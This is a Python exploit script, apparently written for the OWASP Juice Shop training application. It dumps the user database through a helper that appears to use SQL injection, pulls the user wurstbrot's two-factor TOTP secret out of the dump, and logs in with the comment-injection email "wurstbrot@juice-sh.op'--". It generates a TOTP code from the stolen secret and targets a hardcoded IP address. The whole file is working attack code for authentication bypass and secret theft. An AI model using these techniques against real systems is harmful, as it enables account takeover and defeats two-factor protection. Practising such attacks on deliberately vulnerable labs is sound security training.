import requests
from UserCredentials import UserCredentials
import pyotp
import base64

class TFA:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.headers = {"Content-Type": "application/json"}

    def login_as_wurstbrot(self, email="wurstbrot@juice-sh.op'--", password="whatever", secret=""):
        payload = {"email": email, "password": password}
        response = self.session.post(f"{self.base_url}/rest/user/login", json=payload, headers=self.headers)
        PIN = get_totp_code(secret=secret)
        print(PIN)
        if response.status_code == 200 and "authentication" in response.json():
            token = response.json()["authentication"]["token"]
            self.headers["Authorization"] = f"Bearer {token}"
            print(f"[LOGIN] Successfully authenticated. Token: {token}")
            return True
        print("[LOGIN] Failed to authenticate.")
        return False
    
    def handling_totpKey(self):
        db_text = UserCredentials.db_drop(self=UserCredentials(self.base_url))
        print("\n" + db_text + "\n")
        wurst_info = ""
        for string in db_text.split(",{"):
            if "wurstbrot" in string:
                wurst_info = string
        print(wurst_info + "\n")
        totpkey = wurst_info.split('"price":"')[1].split('","deluxePrice"')[0]
        print(totpkey + "\n")
        return totpkey

# endpoint = f"{self.base_url}/rest/2fa/verify"
# print(endpoint)

def get_totp_code(secret):
    totp = pyotp.TOTP(secret)
    return totp.now()
    
def main():
    base_url = "http://45.76.47.218:3000"
    exploit = TFA(base_url)
    totpkey = exploit.handling_totpKey()
    exploit.login_as_wurstbrot(secret=totpkey)

if __name__ == "__main__":
    main()